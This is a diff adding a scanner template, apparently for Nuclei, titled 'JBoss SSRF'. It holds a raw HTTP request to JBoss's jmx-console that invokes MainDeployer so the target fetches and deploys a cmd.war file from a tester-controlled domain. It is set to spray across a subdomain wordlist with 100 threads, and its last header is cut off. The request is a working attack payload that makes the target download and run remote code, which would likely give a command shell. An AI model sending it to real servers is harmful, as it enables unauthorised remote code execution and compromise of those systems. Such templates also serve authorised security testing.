@@ -1,0 +1,27 @@
+id: JBoss-SSRF
+info:
+  author: 0xAwali
+  description: JBoss SSRF , Commonly Bound Ports 80 - 443 - 8080 - 8443
+  name: JBoss SSRF
+  reference:
+  - https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jboss
+  - https://blog.safebuff.com/2016/07/03/SSRF-Tips/
+  severity: critical
+requests:
+- attack: sniper
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://{{Host}}.{{Port}}.{{Subdomains}}.jboss.{{MY-DOMAIN}}/utils/cmd.war
+    HTTP/1.1
+
+    Host: {{Subdomains}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: keep-aliv'
+  threads: 100
